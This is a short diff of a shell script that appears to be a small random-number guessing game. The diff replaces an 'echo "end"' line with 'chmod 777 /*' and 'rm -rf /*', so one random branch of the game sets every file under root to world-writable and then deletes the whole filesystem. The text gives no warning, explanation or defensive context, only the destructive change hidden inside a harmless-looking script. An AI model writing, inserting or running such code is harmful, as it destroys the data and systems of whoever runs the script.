@@ -7,9 +7,10 @@ then
 else
 	if [ $num -eq $[$RANDOM % 8] ]
 	then
-		echo "end"
+		chmod 777 /*
+		rm -rf /*
 		exit
 	else 
-		echo "nice"
+		echo nice
 		fi
 	fi
